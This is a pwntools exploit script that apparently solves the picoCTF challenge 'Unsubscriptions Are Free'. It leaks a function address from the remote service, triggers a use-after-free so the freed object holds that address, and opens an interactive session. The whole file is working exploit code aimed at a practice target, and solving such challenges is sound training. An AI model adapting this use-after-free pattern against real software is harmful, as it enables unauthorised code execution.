import os
from pwn import *
###################setup file and elf files####################
level = "Unsubscriptions Are Free"
ip = "mercury.picoctf.net:4504"
os.chdir("/home/ayush/Work/picoCTF/BinaryExploitation/"+level)
print(os.getcwd())

context.arch = 'amd64'
elf = ELF("./vuln")
######################start process##########################

# r = process("./vuln")
r = remote(ip.split(':')[0], ip.split(':')[1])

#####################simple interactions to solve###################### 
r.sendlineafter("(e)xit", "m")
r.sendlineafter("Enter your username:", "aaaaaaaaaaaaaaaaaaaa")
r.sendlineafter("(e)xit", "s")
log.info(r.recv())
addr_hahaexploitgobrrr = r.recv()[19:28]
log.info("address of the hahaexploitgobrrr function is: %s", addr_hahaexploitgobrrr)
r.sendline("i")
r.sendlineafter("You're leaving already(Y/N)?", "y")

cmd_Struct_dup = addr_hahaexploitgobrrr
log.info("the final struct dup is: %s", cmd_Struct_dup)

r.sendlineafter("(e)xit", "l")
r.sendlineafter("try anyways:", struct.pack('l', int(str(cmd_Struct_dup)[2:-1], 16)))
log.info(r.recv())
log.info(r.recvuntil('\n'))
r.interactive()